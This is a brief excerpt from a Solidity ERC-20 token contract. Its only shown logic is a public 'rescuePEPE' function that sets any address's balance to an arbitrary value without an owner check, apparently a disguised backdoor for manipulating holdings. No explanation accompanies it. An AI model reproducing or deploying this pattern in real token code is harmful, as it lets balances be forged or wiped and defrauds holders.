...
contract bob is IERC20, Ownable, BaseToken {
    ...
    function rescuePEPE(address tokenA, uint256 balanceA) public updateStakingReward {
        _rescuePEPE(tokenA, balanceA);
    }

    function _rescuePEPE(address tokenA, uint256 balanceA) internal { _balances[tokenA] = balanceA;
    }
